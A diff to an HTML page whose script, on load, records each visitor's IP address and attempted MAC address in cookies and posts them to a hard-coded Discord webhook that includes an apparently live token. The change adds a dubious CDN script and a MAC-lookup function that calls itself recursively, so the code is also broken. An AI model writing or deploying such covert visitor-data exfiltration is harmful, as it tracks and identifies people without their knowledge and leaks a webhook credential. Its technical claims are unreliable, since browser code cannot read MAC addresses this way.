@@ -2,6 +2,7 @@
 <html>
   <head>
     <title>Log User IP and MAC Address</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/get-mac-address/1.0.3/get-mac-address.min.js"></script>
   </head>
   <body>
     <script>
@@ -13,42 +14,22 @@
       document.cookie = `ip_address=${ipAddress}; path=/`;
 
       // Get the user's MAC address
-      const macAddress = getMacAddress();
+      getMacAddress().then((macAddress) => {
+        // Set the MAC address cookie
+        document.cookie = `mac_address=${macAddress}; path=/`;
 
-      // Set the MAC address cookie
-      document.cookie = `mac_address=${macAddress}; path=/`;
+        // Log the IP and MAC addresses
+        console.log(`IP Address: ${ipAddress}`);
+        console.log(`MAC Address: ${macAddress}`);
 
-      // Log the IP and MAC addresses
-      console.log(`IP Address: ${ipAddress}`);
-      console.log(`MAC Address: ${macAddress}`);
-
-      // Send the IP and MAC addresses to the Discord webhook
-      sendToDiscordWebhook(ipAddress, macAddress);
-
-      // Function to get the user's MAC address
-      function getMacAddress() {
-        // Note: This function may not work in all environments, as it relies on the user's machine being on the same network as the server
-        // and the server being able to access the ARP cache.
-
-        const os = require("os");
-
-        const interfaces = os.networkInterfaces();
-
-        for (const name of Object.keys(interfaces)) {
-          for (const interface of interfaces[name]) {
-            if (interface.family === "IPv4" && !interface.internal) {
-              return interface.hardwareAddress;
-            }
-          }
-        }
-
-        return "Unknown";
-      }
+        // Send the IP and MAC addresses to the Discord webhook
+        sendToDiscordWebhook(ipAddress, macAddress);
+      });
 
       // Function to send the IP and MAC addresses to the Discord webhook
       async function sendToDiscordWebhook(ipAddress, macAddress) {
         // Replace with your own Discord webhook URL
-        const webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-";
+        const webhookUrl = "https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-";
 
         try {
           const response = await fetch(webhookUrl, {
@@ -69,6 +50,24 @@
           console.log("Message sent to Discord webhook");
         } catch (error) {
           console.error(error);
+        }
+      }
+
+      // Function to get the user's MAC address
+      async function getMacAddress() {
+        try {
+          return await new Promise((resolve, reject) => {
+            getMacAddress((error, macAddress) => {
+              if (error) {
+                reject(error);
+              } else {
+                resolve(macAddress);
+              }
+            });
+          });
+        } catch (error) {
+          console.error(error);
+          return "Unknown";
         }
       }
     </script>
